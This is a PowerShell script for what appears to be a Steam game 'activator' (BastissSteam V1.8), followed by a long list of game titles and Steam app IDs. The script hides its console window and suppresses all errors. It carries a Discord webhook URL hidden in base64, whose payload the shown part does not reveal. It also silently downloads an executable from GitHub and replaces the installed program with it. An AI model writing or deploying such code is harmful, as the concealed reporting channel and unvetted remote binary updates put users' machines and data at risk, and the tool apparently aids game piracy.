function S([string]$b) {
    try { return [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($b)) } catch { return $b }
}
$script:obfKey = [Convert]::FromBase64String("QmFzdGlzc1N0ZWFt")
function D([string]$b) {
    try { return [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($b)) } catch { return $b }
}


Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing
$ProgressPreference = 'SilentlyContinue'
$ErrorActionPreference = 'SilentlyContinue'
$global:ErrorActionPreference = 'SilentlyContinue'

# --- V1.7 FIX rutas 8.3 / perfil inexistente (evita "No existe ningun objeto en la ruta de acceso") ---
function ConvertTo-BsaLongPath { param([string]$Path)
    if ([string]::IsNullOrWhiteSpace($Path)) { return $Path }
    try { $it = Get-Item -LiteralPath $Path -Force -ErrorAction Stop; if ($it) { return $it.FullName } } catch {}
    try { $p = [System.IO.Path]::GetFullPath($Path); if ($p) { return $p } } catch {}
    return $Path
}
function Repair-BsaPaths {
    try {
        $prof = [Environment]::GetEnvironmentVariable('USERPROFILE','Process')
        if ([string]::IsNullOrWhiteSpace($prof) -or -not (Test-Path -LiteralPath $prof)) {
            $real = $null
            try {
                $sid = [System.Security.Principal.WindowsIdentity]::GetCurrent().User.Value
                if ($sid) { $real = (Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProfileList\$sid" -Name ProfileImagePath -ErrorAction SilentlyContinue).ProfileImagePath }
            } catch {}
            if (-not $real) { try { $real = [Environment]::GetFolderPath('UserProfile') } catch {} }
            if (-not $real) { $real = ConvertTo-BsaLongPath $prof }
            if ($real -and (Test-Path -LiteralPath $real)) {
                $env:USERPROFILE = $real
                $local = Join-Path $real 'AppData\Local'
                $roam = Join-Path $real 'AppData\Roaming'
                $tmp = Join-Path $local 'Temp'
                if (-not (Test-Path -LiteralPath $tmp)) { try { New-Item -ItemType Directory -Path $tmp -Force | Out-Null } catch {} }
                if (Test-Path -LiteralPath $local) { $env:LOCALAPPDATA = $local }
                if (Test-Path -LiteralPath $roam) { $env:APPDATA = $roam }
                if (Test-Path -LiteralPath $tmp) { $env:TEMP = $tmp; $env:TMP = $tmp }
            }
        }
    } catch {}
    foreach ($n in 'USERPROFILE','LOCALAPPDATA','APPDATA','TEMP','TMP') {
        try {
            $v = [Environment]::GetEnvironmentVariable($n,'Process')
            if (-not [string]::IsNullOrWhiteSpace($v)) { $l = ConvertTo-BsaLongPath $v; if ($l -ne $v) { [Environment]::SetEnvironmentVariable($n,$l,'Process') } }
        } catch {}
    }
    try {
        if ([string]::IsNullOrWhiteSpace($env:TEMP) -or -not (Test-Path -LiteralPath $env:TEMP)) {
            $alt = Join-Path $env:SystemRoot 'Temp'
            if (Test-Path -LiteralPath $alt) { $env:TEMP = $alt; if ([string]::IsNullOrWhiteSpace($env:TMP)) { $env:TMP = $alt } }
        }
    } catch {}
}
Repair-BsaPaths
# --- fin FIX rutas ---

$script:expiryWatcher = $false
try {
    $cliArgsAll = @($args) + @([Environment]::GetCommandLineArgs())
    if ($cliArgsAll -contains '-expiry' -or $env:BSMAP_EXPIRY -eq '1') { $script:expiryWatcher = $true }
} catch {}

$script:singleMutex = $null
if (-not $script:expiryWatcher) {
    try {
        $script:singleMutex = New-Object System.Threading.Mutex($false, "Local\BastissSteamActivatorMutex")
        $mGot = $false
    try { $mGot = $script:singleMutex.WaitOne(0) } catch [System.Threading.AbandonedMutexException] { $mGot = $true }
    if (-not $mGot) {
        Get-Process | Where-Object { $_.Id -ne $PID -and ($_.ProcessName -like 'BastissSteamActivator*' -or $_.MainWindowTitle -match 'BastissSteam') } | Stop-Process -Force -ErrorAction SilentlyContinue
        Start-Sleep -Milliseconds 900
        try { $null = $script:singleMutex.WaitOne(0) } catch [System.Threading.AbandonedMutexException] { }
    }
    } catch {}
}

trap {
    if ($_.Exception.Message -match 'ya existe|already exists') {
        try { Add-Content -Path (Join-Path $env:TEMP 'bsmap_error.log') -Value "[$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] TRAP_SUPPRESSED already exists: $($_.Exception.Message)`n$($_.InvocationInfo.PositionMessage)" -Encoding UTF8 } catch {}
        continue
    }
    try { Add-Content -Path (Join-Path $env:TEMP 'bsmap_error.log') -Value "[$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] TRAP: $($_.Exception.Message)`n$($_.InvocationInfo.PositionMessage)`n$($_.ScriptStackTrace)" -Encoding UTF8 } catch {}
}
try {
    [System.Windows.Forms.Application]::SetUnhandledExceptionMode([System.Windows.Forms.UnhandledExceptionMode]::CatchException)
    [System.Windows.Forms.Application]::add_ThreadException({
        param($s,$e)
        $m=$e.Exception.Message
        if ($m -match 'ya existe|already exists') {
            try { Add-Content -Path (Join-Path $env:TEMP 'bsmap_error.log') -Value "[$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] THREAD_SUPPRESSED already exists: $m" -Encoding UTF8 } catch {}
            return
        }
        try { Add-Content -Path (Join-Path $env:TEMP 'bsmap_error.log') -Value "[$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] THREAD: $m`n$($e.Exception.StackTrace)" -Encoding UTF8 } catch {}
    })
    [AppDomain]::CurrentDomain.add_UnhandledException({
        param($s,$e)
        try { $ex=$e.ExceptionObject; Add-Content -Path (Join-Path $env:TEMP 'bsmap_error.log') -Value "[$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] DOMAIN: $($ex.Message)`n$($ex.StackTrace)" -Encoding UTF8 } catch {}
    })
} catch {}
function Safe-FileCreate([string]$p) {
    try { if (Test-Path -LiteralPath $p) { Remove-Item -LiteralPath $p -Force -ErrorAction SilentlyContinue } } catch {}
    try { $d=Split-Path $p -Parent; if ($d -and -not (Test-Path $d)) { New-Item -ItemType Directory -Path $d -Force | Out-Null } } catch {}
    return [System.IO.File]::Create($p)
}
if (-not $script:expiryWatcher) {
    [System.Windows.Forms.Application]::EnableVisualStyles()
    [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12 -bor [System.Net.SecurityProtocolType]::Tls13
    Add-Type @"
using System;
using System.Runtime.InteropServices;
public class DwmHelper {
    [DllImport("dwmapi.dll")]
    public static extern int DwmSetWindowAttribute(IntPtr hwnd, int attr, ref int attrValue, int attrSize);
    [DllImport("kernel32.dll")]
    public static extern IntPtr GetConsoleWindow();
    [DllImport("user32.dll")]
    public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
    [DllImport("shell32.dll")]
    public static extern int SetCurrentProcessExplicitAppUserModelID([MarshalAs(UnmanagedType.LPWStr)] string AppID);
}
"@
    try { [DwmHelper]::SetCurrentProcessExplicitAppUserModelID("BastissSteam.Activator") | Out-Null } catch {}
    try { $cw = [DwmHelper]::GetConsoleWindow(); if ($cw -ne [IntPtr]::Zero) { [DwmHelper]::ShowWindow($cw, 0) | Out-Null } } catch {}
}


if (-not $script:expiryWatcher) {
    try {
        $script:siMutex = New-Object System.Threading.Mutex($false, 'BastissSteamActivator2_SI')
        $mGot2 = $false
    try { $mGot2 = $script:siMutex.WaitOne(0) } catch [System.Threading.AbandonedMutexException] { $mGot2 = $true }
    if (-not $mGot2) {
        Get-Process | Where-Object { $_.Id -ne $PID -and ($_.ProcessName -like 'BastissSteamActivator*' -or $_.MainWindowTitle -match 'BastissSteam') } | Stop-Process -Force -ErrorAction SilentlyContinue
        Start-Sleep -Milliseconds 900
        try { $null = $script:siMutex.WaitOne(0) } catch [System.Threading.AbandonedMutexException] { }
    }
    } catch {}
}

# ---- Reemplazar el exe instalado por la ultima version ----
function Update-LocalExe {
    try {
        $exePath = Join-Path $env:LOCALAPPDATA 'BastissSteam\BastissSteamActivator2.exe'
        if (-not (Test-Path -LiteralPath $exePath)) { return }
        $tmpExe = "$exePath.new"
        try { if (Test-Path -LiteralPath $tmpExe) { Remove-Item -LiteralPath $tmpExe -Force -ErrorAction SilentlyContinue } } catch {}
        $null = & curl.exe -sL -f --ssl-no-revoke --tlsv1.2 --noproxy "*" --max-time 60 -o "$tmpExe" "https://raw.githubusercontent.com/bastisayes/BastissSteamV18/main/BastissSteamActivator3.exe" 2>&1
        if ($LASTEXITCODE -eq 0 -and (Test-Path -LiteralPath $tmpExe) -and ((Get-Item -LiteralPath $tmpExe).Length -gt 100000)) {
            try { if (Test-Path -LiteralPath $exePath) { Remove-Item -LiteralPath $exePath -Force -ErrorAction SilentlyContinue } } catch {}
            Move-Item -LiteralPath $tmpExe -Destination $exePath -Force
        } else { Remove-Item -LiteralPath $tmpExe -Force -ErrorAction SilentlyContinue }
    } catch {}
}
function New-BufferedPanel {
    $p = New-Object System.Windows.Forms.Panel
    $bf = [System.Reflection.BindingFlags]'Instance,NonPublic'
    try { $p.GetType().GetProperty('DoubleBuffered',$bf).SetValue($p,$true) } catch {}
    try {
        $flags = [int][System.Windows.Forms.ControlStyles]::AllPaintingInWmPaint + [int][System.Windows.Forms.ControlStyles]::UserPaint + [int][System.Windows.Forms.ControlStyles]::OptimizedDoubleBuffer
        $p.GetType().GetMethod('SetStyle',$bf).Invoke($p,@([System.Windows.Forms.ControlStyles]$flags,$true)) | Out-Null
    } catch {}
    $p
}








$script:version = "V1.8"
$errorLogFile = Join-Path $env:TEMP (S("YnNtYXBfZXJyb3IubG9n"))

function WEL {
    param([string]$Msg, $Ex)
    try {
        $text = "[$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] $Msg"
        if ($Ex) { $text += "`nEXCEPTION: $($Ex.Exception)`nAT: $($Ex.InvocationInfo.PositionMessage)`nSTACK: $($Ex.ScriptStackTrace)" }
        Add-Content -Path $errorLogFile -Value $text -Encoding UTF8 -ErrorAction SilentlyContinue
    } catch {}
}


$WEBHOOK_URL = (D "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTUxMTQ5NTMzMDIzMzg0Nzg1OC9xMVZ4NU9SblBzV3VLRnJWbnByVXVpZTZ5YVdlUmVLcHJ1anpfUnZyal9BUzh1MFNPeG1iN05TaHRWZXladDJFWEllTQ==")

$script:bgPowershells = @()
function Invoke-BgNoWait {
    param([scriptblock]$sb, [object[]]$argList)
    try {
        $ps = [PowerShell]::Create()
        [void]$ps.AddScript($sb)
        foreach ($a in @($argList)) { [void]$ps.AddArgument($a) }
        $h = $ps.BeginInvoke()
        $script:bgPowershells += @{ ps=$ps; h=$h }
        if (@($script:bgPowershells).Count -gt 24) {
            $alive = @()
            foreach ($j in @($script:bgPowershells)) {
                if ($j.h.IsCompleted) { try { $j.ps.EndInvoke($j.h) } catch {}; try { $j.ps.Dispose() } catch {} } else { $alive += $j }
            }
            $script:bgPowershells = $alive
        }
    } catch {}
}
function Start-SleepDoEvents([int]$ms) {
    $end = (Get-Date).AddMilliseconds($ms)
    while ((Get-Date) -lt $end) {
        try { [System.Windows.Forms.Application]::DoEvents() } catch {}
        Start-Sleep -Milliseconds 25
    }
}
function Invoke-PsBlockingDoEvents {
    param([scriptblock]$sb, [object[]]$argList)
    $pool = $null; $ps = $null
    try {
        $pool = [RunspaceFactory]::CreateRunspacePool(1, 1)
        $pool.Open()
        $ps = [PowerShell]::Create()
        $ps.RunspacePool = $pool
        [void]$ps.AddScript($sb)
        foreach ($a in @($argList)) { [void]$ps.AddArgument($a) }
        $h = $ps.BeginInvoke()
        while (-not $h.IsCompleted) {
            try { [System.Windows.Forms.Application]::DoEvents() } catch {}
            Start-Sleep -Milliseconds 40
        }
        $out = $ps.EndInvoke($h)
        if ($out -and @($out).Count -gt 0) { return $out[0] }
        return $null
    } catch { return $null }
    finally { try { if ($ps) { $ps.Dispose() } } catch {}; try { if ($pool) { $pool.Close(); $pool.Dispose() } } catch {} }
}

function Format-Juegos([int]$n) {
    if ($n -ge 59) { return "+1000 juegos" }
    if ($n -eq 1) { return "1 juego" }
    return "$n juegos"
}

$script:GAME_NAME_DATA = @'
/R - A Neurodivergent Thriller (3396850)
007 First Light (3768760)
1 Screen Platformer (791180)
1 Screen Platformer: Prologue (1271540)
100 Crime Cats (2954460)
105400 (no data) (105400)
20 Minute Metropolis - The Action City Builder (700200)
255480 (no data) (255480)
3 Minutes to Midnight® - A Comedy Graphic Adventure (832500)
380 (error) (380)
3D PUZZLE - Sun Temple (3079410)
60 Seconds! Reatomized (1012880)
7 Days to Die (251570)
911 Operator (503560)
911: Prey (2537120)
A Hat in Time (253230)
A Plague Tale: Innocence (752590)
A Plague Tale: Requiem (1182900)
A Robot Named Fight! (603530)
A Short Hike (1055540)
A Solitaire Mystery (3743220)
A Space for the Unbound (1201270)
A Story About My Uncle (278360)
A Total War Saga: TROY (1099410)
A Way Out (1222700)
A Webbing Journey (2073910)
Abalon: Roguelike Tactics CCG (1681840)
Abandoned Souls (2412490)
Abandoned Stories: Inherited Silence (4478760)
Abandoned Void (2420450)
ABZU (384190)
Academy Love Saga: Tennis Angels EX (3099640)
Ace Attorney Investigations Collection (2401970)
Advent NEON® (1528260)
Aerofly FS 2 Flight Simulator (434030)
Aerofly FS 4 Flight Simulator (1995890)
aerofly RC 10 - RC Flight Simulator (2394350)
Aery - Cyber City (2711630)
Age of Empires II: Definitive Edition (813780)
Age of Empires III: Definitive Edition (933110)
Age of Empires IV: Anniversary Edition (1466860)
Age of Mythology: Extended Edition (266840)
Age of Mythology: Retold (1934680)
AI: The Somnium Files (948740)
AI: THE SOMNIUM FILES - nirvanA Initiative (1449200)
AKIBA'S TRIP: Undead ＆ Undressed (333980)
Alan Wake (108710)
Alan Wake's American Nightmare (202750)
Alchemy Factory (3669570)
Alice in CyberCity (1072000)
Almost There: The Platformer (951940)
Alpha Protocol™ (34010)
American Truck Simulator (270880)
AMID EVIL (673130)
Amnesia: Rebirth (999220)
Amnesia: The Bunker (1944430)
Amnesia: The Dark Descent (57300)
Ancestors: The Humankind Odyssey (536270)
Ancient Cities (667610)
Ancient Dungeon (1125240)
Ancient Enemy (993790)
Ancient Kingdoms (2241380)
Ancient Saga: Vikings Journey (2307690)
Ancient Warfare 3 (758990)
Angel Engine (4173750)
Angel Legion (1333350)
Angels & Demigods - SciFi VR Visual Novel (503160)
Angels Fall First (367270)
Anno 1800 (916440)
Another Farm Roguelike (2116850)
Aragami (280160)
Aragami 2 (1158370)
Arcade Tycoon ™ : Simulation Game (750520)
Arcanum: Of Steamworks and Magick Obscura (500810)
ARK: Survival Ascended (2399830)
ARK: Survival Evolved (346110)
Arma 3 (107410)
Arms of God (3100310)
Asgard's Fall — Viking Survivors (2780710)
Assassin's Creed 2 (33230)
Assassin's Creed Mirage (3035570)
Assassin's Creed® III Remastered (911400)
Assassin's Creed® Odyssey (812140)
Assassin's Creed® Origins (582160)
Assassin's Creed® Revelations (201870)
Assassin's Creed® Syndicate (368500)
Assassin's Creed® Unity (289650)
Assassin’s Creed Shadows (3159330)
Assassin’s Creed® Brotherhood (48190)
Assassin’s Creed® Chronicles: China (354380)
Assassin’s Creed® IV Black Flag™ (242050)
Assassin’s Creed® Liberation HD (260210)
Assassin’s Creed® Rogue (311560)
Assault Android Cactus+ (250110)
Assetto Corsa (244210)
ASTRONEER (361420)
ATOM RPG: Post-apocalyptic indie game (552620)
Atomic Heart (668580)
Attack on Titan 2 - A.O.T.2 (601050)
Automobilista 2 (1066890)
Avatar Legends: The Fighting Game (2424420)
Avatar: Frontiers of Pandora™ (2840770)
Axiom Verge (332200)
Back 4 Blood (924970)
Backrooms Exploration (1730930)
Backrooms: Escape Together (2141730)
Balatro (2379780)
Baldur's Gate 3 (1086940)
Baldur's Gate II: Enhanced Edition (257350)
Baldur's Gate: Enhanced Edition (228280)
Batman: Arkham Asylum Game of the Year Edition (35140)
Batman: Arkham City (57400)
Batman: Arkham City - Game of the Year Edition (200260)
Batman™: Arkham Origins Blackgate - Deluxe Edition (267490)
Battlefield 3™ (1238820)
Battlefield 4™ (1238860)
Battlefield™ 1 (1238840)
Battlefield™ 6 (2807960)
Battlefield™ Hardline (1238880)
Battlefield™ V (1238810)
Battlefleet Gothic: Armada 2 (573100)
Bayonetta (460790)
BeamNG.drive (284160)
Best Elf (1583240)
BIGFOOT (509980)
BioShock Infinite (8870)
BioShock® 2 (8850)
BioShock™ (7670)
BioShock™ 2 Remastered (409720)
BioShock™ Remastered (409710)
Black Mesa (362890)
Black Myth: Wukong (2358720)
Blacklist Mafia (2800500)
Blasphemous (774361)
Blood Omen 2: Legacy of Kain (242960)
Book of Yog Idle RPG (1097430)
Borderlands 2 (49520)
Borderlands 3 (397540)
Borderlands Game of the Year (8980)
Borderlands Game of the Year Enhanced (729040)
Borderlands: The Pre-Sequel (261640)
Boss Rush: Mythology (1237870)
Braid (26800)
Brick Building (1352440)
Broforce (274190)
Brotato (1942280)
Brothers - A Tale of Two Sons (225080)
Building Destruction (2154730)
Building our Futature (2178860)
Bulletstorm: Full Clip Edition (501590)
Bully: Scholarship Edition (12200)
Bulwark: Falconeer Chronicles (290100)
Bunker - The Underground Game (354180)
Burgie's Cozy Kitchen (3314340)
Bus Simulator 16 (324310)
Bus Simulator 18 (515180)
Bus Simulator 21 Next Stop (976590)
Bus Simulator 27 (2397320)
Bus-Simulator 2012 (253770)
Call of Duty: World at War (10090)
Call of Duty® 4: Modern Warfare® (2007) (7940)
Call of Duty®: Black Ops (42700)
Call of Duty®: Black Ops II (202970)
Call of Duty®: Infinite Warfare (292730)
Call of Duty®: Modern Warfare® 2 (2009) (10180)
Call of Duty®: Modern Warfare® 3 (2011) (42680)
Car Mechanic Simulator 2014 (270850)
Car Mechanic Simulator 2015 (320300)
Car Mechanic Simulator 2018 (645630)
Car Mechanic Simulator 2021 (1190000)
Card Survival: Tropical Island (1694420)
Caribbean Legend (2230980)
Carp Fishing Simulator (366290)
CARRION (953490)
CarX Street (1114150)
Casino Management Simulator (2823790)
Castle Craft (2086680)
Castle Crashers® (204360)
CastleMiner Z (253430)
Cats Visiting Historical Times (3618700)
Cave Story+ (200900)
Celeste (504230)
Charles Haunted Mansion (2569680)
Chef RPG (1796790)
Chronology (269330)
Citizen Sleeper 2: Starward Vector (2442460)
City Builder (843780)
City Gangster Simulator (3612460)
Clone Drone in the Danger Zone (597170)
Clone Drone in the Hyperdome (2401230)
CODE VEIN (678960)
Cognition: An Erica Reed Thriller (242780)
Colony On Mars (773640)
Colony Survival (366090)
Combolands: Roguelike Citybuilder (4075620)
Concrete Jungle (400160)
Condemned: Criminal Origins (4720)
Conflict Desert Storm™ (211780)
Contraband Police (756800)
CONTROL Ultimate Edition (870780)
Cooking Companions (1263230)
Cooking Craze (2540630)
Cooking Dash® (37220)
Cooking Simulator (641320)
Cooking Simulator 2: Better Together (2455360)
Cooking Simulator VR (1358140)
Core Keeper (1621690)
Cozy Caravan (2788520)
Cozy Cleaner (2742710)
Cozy Grove: Camp Spirit (2021960)
Crafting Block World (1120960)
Crafting Idle Clicker (1250790)
Crayon Physics Deluxe (26900)
Crime Boss: Rockay City (2933080)
Crime Scene Cleaner (1040200)
Crime Simulator (2737070)
Crime Simulator: Playgrounds (2928280)
Crimson Desert Enhanced (3321460)
CrossCode (368340)
Cruelty Squad (1388770)
Crusader Kings III (1158310)
Crypt Robbery (3362670)
Crysis (17300)
Crysis 2 - Maximum Edition (108800)
Crysis Remastered (1715130)
Crysis Warhead® (17330)
Cthulhu Mythos ADV Lunatic Whispers (1965920)
Cthulhu Mythos ADV The Isle Of Ubohoth (2701590)
Cthulhu Saves the World (107310)
Cube Life: Island Survival (760800)
Cubic Odyssey (3400000)
Cuphead (268910)
Cursed Armor (907090)
Cursed Armor 2 (3276280)
Cursed Companions (3265230)
Cyber City (1061930)
Cyber City 2157: The Visual Novel (454690)
Cyber Hook (1130410)
Cyber Utopia (654350)
CyberCity: SEX Saga (2407350)
Cyberpunk 2077 (1091500)
Dagon: by H. P. Lovecraft (1481400)
Dark Elf Historia (2492730)
Dark Hunting Ground (2494810)
DARK SOULS™ II: Scholar of the First Sin (335300)
DARK SOULS™ III (374320)
DARK SOULS™: REMASTERED (570940)
Darkest Dungeon® (262060)
Darkest Dungeon® II (1940340)
Darksiders Genesis (710920)
Darksiders II Deathinitive Edition (388410)
Darksiders III (606280)
Darksiders Warmastered Edition (462780)
Darksiders™ (50620)
Database Detective: Minor Crimes Division (3950130)
DATE A LIVE: Ren Dystopia (2627780)
Days Gone (1259420)
Dead Age 2: The Zombie Survival RPG (951430)
Dead Cells (588650)
Dead Island 2 (934700)
Dead Island Definitive Edition (383150)
DEAD RISING® (427190)
Dead Rising® 2 (45740)
Dead Space (1693980)
Dead Space™ 2 (47780)
Dead Space™ 3 (1238060)
Dead Synchronicity: Tomorrow Comes Today (339190)
Death Match Love Comedy! (1265570)
DEATH STRANDING (1190460)
DEATH STRANDING DIRECTOR'S CUT (1850570)
Death's Door (894020)
DEATHLOOP (1252330)
Deep Sea Valentine (1536720)
Deer Hunting Camp (3692240)
DELTARUNE (1671210)
Demon Lord: Just a Block (3720420)
Demon Maiden and Slave Summoning (1997460)
Demon Slayer -Kimetsu no Yaiba- The Hinokami Chronicles 2 (2928600)
DEMON'S TILT (422510)
Demonologist (1929610)
Desire Empire (4651940)
Destiny 2 (1085660)
Detective Case and Clown Bot in: Murder in the Hotel Lisbon (297290)
Detective Case and Clown Bot in: The Express Killer (711920)
Detective Grimoire (272600)
Detective Instinct: Farewell, My Beloved (2689930)
Detroit: Become Human (1222140)
DEUS EX MACHINA 2 (353610)
Deus Ex: Breach (555450)
Deus Ex: Game of the Year Edition (6910)
Deus Ex: Human Revolution - Director's Cut (238010)
Deus Ex: Invisible War (6920)
Deus Ex: Mankind Divided (337000)
Deus Ex: Mankind Divided™ - VR Experience (526180)
Devil May Cry 5 (601150)
Devil May Cry HD Collection (631510)
Dieselpunk Wars (952240)
DiRT Rally 2.0 (690790)
Disco Elysium - The Final Cut (632470)
Dishonored 2 (403640)
Dishonored®: Death of the Outsider™ (614570)
Disney Dreamlight Valley (1401590)
Disney Princess: Enchanted Journey (322130)
Divinity: Original Sin - Enhanced Edition (373420)
Divinity: Original Sin 2 - Definitive Edition (435150)
Do Not Feed the Monkeys (658850)
Doki Doki Literature Club! (698780)
DOOM (379720)
DOOM Eternal (782330)
DOOM: The Dark Ages (3017860)
Dragon Age II: Ultimate Edition (1238040)
Dragon Age: Origins - Ultimate Edition (47810)
Dragon Age™ Inquisition (1222690)
DRAGON BALL FighterZ (678950)
DRAGON BALL XENOVERSE (323470)
DRAGON BALL XENOVERSE 2 (454650)
DRAGON BALL Z: KAKAROT (851850)
DRAGON BALL: Sparking! ZERO (1790600)
DRAGON QUEST BUILDERS (2436570)
DRAGON QUEST BUILDERS™ 2 (1072420)
DRAGON QUEST I & II HD-2D Remake (2893570)
DRAGON QUEST III HD-2D Remake (2701660)
DRAGON QUEST MONSTERS: The Dark Prince (2175540)
DRAGON QUEST TREASURES (2021210)
DRAGON QUEST VII Reimagined (2499860)
DRAGON QUEST® XI S: Echoes of an Elusive Age™ - Definitive Edition (1295510)
Dragon's Dogma: Dark Arisen (367500)
DragonSword : Awakening (4570720)
Drama Queens (2741820)
Duck Detective: The Secret Salami (2637990)
Duck Life: Retro Pack (1433950)
Dungeon Settlers (2798330)
DUSK (519860)
Dust: An Elysian Tail (236090)
Dwarf Defense (857850)
Dwarf Fortress (975370)
Dwarf Shop (1247640)
Dwarf Tower (335100)
Dying Light (239140)
Dying Light 2 Stay Human: Reloaded Edition (534380)
Dying Light: The Beast (3008130)
EA SPORTS™ FIFA 21 (1313860)
Ecrazeus Castle (4106270)
ELDEN RING (1245620)
ELDEN RING NIGHTREIGN (2622380)
Elf Sex Farm (1738990)
Elite Dangerous (359320)
ENDLESS Legend™ 2 (3407390)
Enter the Gungeon (311690)
Escape Academy (1812090)
Escape From Duckov (3167020)
Escape Simulator (1435790)
Escape Simulator 2 (2879840)
Escape the Backrooms (1943950)
Etrian Odyssey HD (1868180)
Euro Truck Simulator 2 (227300)
European Ship Simulator (299250)
Exit the Gungeon (1209490)
ExoColony: Planet Survival (2187340)
F-19 Stealth Fighter (347250)
F.E.A.R. 2: Project Origin (16450)
F1® 2021 (1134570)
F1® 25 (3059520)
Fable Anniversary (288470)
Factorio (427520)
Fallout 2: A Post Nuclear Role Playing Game (38410)
Fallout 3 (22300)
Fallout 3: Game of the Year Edition (22370)
Fallout 4 (377160)
Fallout 76 (1151340)
Fallout Tactics: Brotherhood of Steel (38420)
Fallout: A Post Nuclear Role Playing Game (38400)
Fallout: New Vegas (22380)
False Myth (1257200)
Fantastic Orc (2672110)
Far Cry 3 - Blood Dragon (233270)
Far Cry® 2 (19900)
Far Cry® 4 (298110)
Far Cry® 5 (552520)
Far Cry® 6 (2369390)
Far Cry® New Dawn (939960)
Far Cry® Primal (371660)
Faraway: Jungle Escape (1747680)
Farming Simulator 17 (447020)
Farming Simulator 19 (787860)
Farming Simulator 22 (1248130)
Farming Simulator 25 (2300320)
Fear of The Undead: Rise of Evil (2263220)
FEZ (224760)
FIFA 22 (1506830)
FINAL FANTASY TACTICS - The Ivalice Chronicles (1004640)
FINAL FANTASY VII REMAKE INTERGRADE (1462040)
FINAL FANTASY X/X-2 HD Remaster (359870)
FINAL FANTASY XII THE ZODIAC AGE (595520)
FINAL FANTASY XV WINDOWS EDITION (637650)
FINAL FANTASY® XIII (292120)
FINAL FANTASY® XIII-2 (292140)
Fireside Fables: Wholesome Narrative Adventure! (3365560)
Firestone – Idle Clicker Online RPG (1013320)
Firewatch (383870)
First Dwarf (1714900)
Fishing Planet (380600)
Five Nights at Freddy's (319510)
Five Nights at Freddy's 2 (332800)
Five Nights at Freddy's 3 (354140)
Five Nights at Freddy's 4 (388090)
FIVE NIGHTS AT FREDDY'S: HELP WANTED (732690)
Five Nights at Freddy's: Help Wanted 2 (2287520)
Five Nights at Freddy's: Into the Pit (2638370)
Five Nights at Freddy's: Secret of the Mimic (2215390)
Five Nights at Freddy's: Security Breach (747660)
Five Nights at Freddy's: Sister Location (506610)
Florence (1102130)
FlyKnight (3108510)
Football Manager 2023 (1904540)
Footgun: Underground (2206240)
Forage Wizard (3868320)
Forensics: Crime Scene Detective (3765010)
Forest Escape: Last Train (4090360)
Forest Hustle (4168290)
Forgotten Realms: Demon Stone (3843530)
Forgotten Seas (2168260)
Forza Horizon 4 (1293830)
Forza Horizon 5 (1551360)
Forza Horizon 6 (2483190)
Four Last Things (503400)
Freddi Fish 2: The Case of the Haunted Schoolhouse (294530)
Freddy Fazbear's Pizzeria Simulator (738060)
Frog Detective 2: The Case of the Invisible Wizard (1047220)
From Dust (33460)
Frostpunk (323190)
Frostpunk 2 (1601580)
Fungal Colony Sim 2 (3947310)
Furry Myth 🦁 (2451640)
Future War Tactics: SOF vs Alien Invasion – Turn-Based Strategy (3680900)
Garry's Mod (4000)
Gassal Simulation (3397390)
Gears 5 (1097840)
Gems of War - Puzzle RPG (329110)
Gentoo Rescue (2830480)
Ghost Janitors (2772990)
Ghost Trick: Phantom Detective (1967430)
Ghost Watchers (1850740)
Ghostrunner (1139900)
Ghosts'n DJs (1207390)
Ghostwire: Tokyo (1475810)
Giant Machines 2017 (402750)
Giant Waifu Wash Simulator 💦 (4719730)
Giant Wishes (2122360)
Global Rescue (2873660)
Goat Simulator (265930)
Goat Simulator 3 (850190)
GOD EATER 3 (899440)
God of War (1593500)
God of War Ragnarök (2322010)
God Simulator (509440)
Going Medieval (1029780)
Gold Gold Adventure Gold (3133650)
GONE Fishing (3645890)
Good Pizza, Great Pizza - Cooking Simulator Game (770810)
Gorogoa (557600)
Gothic II: Gold Edition (39510)
Grand Theft Auto III – The Definitive Edition (1546970)
Grand Theft Auto IV: The Complete Edition (12210)
Grand Theft Auto V Enhanced (3240220)
Grand Theft Auto: San Andreas – The Definitive Edition (1547000)
Grand Theft Auto: Vice City – The Definitive Edition (1546990)
Grandpa High on Retro (2967320)
Grass Life Sim (3356720)
Great Utopia (1220990)
GreedFall (606880)
Green Hell (815370)
Griftlands (601840)
GRIS (683320)
Grounded (962130)
Grounded 2 (2661300)
Gumshoe Detective Agency: The First Case (3632910)
Gunman Contracts - Stand Alone (2421750)
Hades (1145360)
Half-Life (70)
Half-Life 2: Episode Two (420)
Halo: Campaign Evolved (2806050)
Haunted Investigation (2400880)
Haunted Room : 205 (3694590)
Heavy Bullets (297120)
Heavy Rain (960910)
Hellblade II: Senua’s Saga (2461850)
Hello Kitty Island Adventure (2495100)
Hello Neighbor (521890)
Hello Neighbor 2 (1321680)
Hi-Fi RUSH (1817230)
Hidden Deep (976890)
Hidden Folks (435400)
Hidden Kitten (2402200)
Hidden Realm of the Enchantress (3159120)
Hidden SciFi City Top-Down 3D (2506870)
Hidden Through Time (524910)
High Strategy: Urukon (1254870)
Hitman: Absolution™ (203140)
Hogwarts Legacy (990080)
Hollow Knight (367520)
Hollow Knight: Silksong (1030300)
Homefront (55100)
Horizon Chase Turbo (389140)
Horizon Forbidden West™ Complete Edition (2420110)
Horizon Zero Dawn™ Complete Edition (1151640)
Hotel Giant (502460)
Hotel Giant 2 (38230)
Hotline Miami 2: Wrong Number (274170)
House Flipper (613100)
House Flipper 2 (1190970)
House Flipper Remastered Collection (3710840)
Human Fall Flat (477160)
Hunting Simulator 2 (1135910)
Hunting Unlimited 2010 (12690)
HYPER DEMON (1743850)
Hyper Light Drifter (257850)
I Am Gangster (1877830)
Icewind Dale: Enhanced Edition (321800)
Idle Champions of the Forgotten Realms (627690)
Idle Wizard (992070)
IdleOn - The Incremental MMO (1476970)
Incredible Dracula 4: Games Of Gods (1092510)
Indie Dream (612060)
Indie Game: The Movie (207080)
Industry Giant 2 (271360)
Infinity Kingdom (1573360)
Inscryption (1092790)
INSIDE (304430)
Internet Cafe Simulator 2 (1563180)
Into the Breach (590380)
